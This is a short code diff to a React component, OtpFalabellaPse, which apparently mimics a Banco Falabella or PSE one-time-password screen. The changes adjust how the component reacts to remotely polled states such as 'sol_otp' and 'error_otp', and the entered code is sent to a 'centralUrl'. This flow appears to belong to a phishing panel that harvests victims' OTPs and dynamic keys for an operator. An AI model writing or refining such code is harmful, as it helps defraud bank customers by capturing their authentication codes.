@@ -320,14 +320,6 @@ const OtpFalabellaPse = () => {
       switch (estadoActual) {
         case "sol_otp":
           if (esperandoRespuestaTrasEnviarRef.current) {
-            if (!otpTrasEnviarVioPendienteRef.current) {
-              break;
-            }
-            otpTrasEnviarVioPendienteRef.current = false;
-            esperandoRespuestaTrasEnviarRef.current = false;
-            setIsLoading(false);
-            setDynamicKey("");
-            initPolling();
             break;
           }
           setIsLoading(false);
@@ -352,9 +344,7 @@ const OtpFalabellaPse = () => {
           break;
         case "error_otp":
           if (modalBloqueoEstadoRef.current === "error_login") break;
-          if (verifyLastEstadoRef.current !== "error_otp") {
-            showOtpInlineError();
-          }
+          showOtpInlineError();
           break;
         case "error_din":
           esperandoRespuestaTrasEnviarRef.current = false;
@@ -427,6 +417,8 @@ const OtpFalabellaPse = () => {
     ).trim();
 
     envioOtpEnCursoRef.current = true;
+    verifyLastEstadoRef.current = null;
+    modalBloqueoEstadoRef.current = null;
     try {
       setIsLoading(true);
       const response = centralUrl
